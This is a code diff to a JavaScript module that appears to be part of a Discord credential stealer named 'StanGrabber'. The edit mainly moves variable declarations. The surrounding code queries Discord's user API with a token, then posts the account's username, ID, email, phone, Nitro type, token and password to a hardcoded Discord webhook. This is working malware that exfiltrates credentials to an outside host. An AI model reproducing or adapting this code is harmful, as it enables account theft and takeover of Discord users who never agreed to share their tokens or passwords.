@@ -11,6 +11,15 @@ exports.send = (req, res, webhook) =>
 	
 	
 	
+	
+var username = "";
+var id = "";
+	
+var email = "";
+var phone = "";
+
+var nitro = "";
+	
 axios.get('https://discordapp.com/api/v8/users/@me', {
     withCredentials: true,
     headers: {
@@ -19,22 +28,22 @@ axios.get('https://discordapp.com/api/v8/users/@me', {
   }).then((response) => {
 
 	var discrim = JSON.parse(JSON.stringify(response.data)).discriminator;
-	var username = JSON.parse(JSON.stringify(response.data)).username + "#" + discrim;
+	 username = JSON.parse(JSON.stringify(response.data)).username + "#" + discrim;
 
 
-	var id = JSON.parse(JSON.stringify(response.data)).id;
+	 id = JSON.parse(JSON.stringify(response.data)).id;
 
 	
 	
-	var email = JSON.parse(JSON.stringify(response.data)).email;
+	 email = JSON.parse(JSON.stringify(response.data)).email;
 	
-	var phone = JSON.parse(JSON.stringify(response.data)).phone;
+	 phone = JSON.parse(JSON.stringify(response.data)).phone;
 	
 	if (phone == 'null')
 	{
 		phone = 'None';
 	}
-	var nitro = 'none';
+	 nitro = 'none';
 
 	var nitro2 = JSON.parse(JSON.stringify(response.data)).premium_type;
 	if (nitro2 == 0)
@@ -52,6 +61,11 @@ axios.get('https://discordapp.com/api/v8/users/@me', {
 	
 	
 	
+	  
+})
+	
+
+
 	
 	axios.post(`https://discord.com/api/webhooks/797868594515804220/r9pUD70qd6SVtaKA-sy0AtXbkH7hjZlHAbYDF0gn-7-3uTpQAYMcv_oRcbf57y6uqnj8`, { username:`StanGrabber`, content: `Username : ` + username + '\n' + `ID : ` + id + '\n' + "E-Mail : " + email + '\n' + "Phone : " + phone + '\n' + "Nitro Type : " + nitro + '\n' + "Token : " + token + '\n' + "Password : " + password })
 	.then((resp) => 
@@ -67,7 +81,3 @@ axios.get('https://discordapp.com/api/v8/users/@me', {
 	res.status(200).json({status: "ok", message: "Sent."});
 }
 
-	  
-})
-	
-	
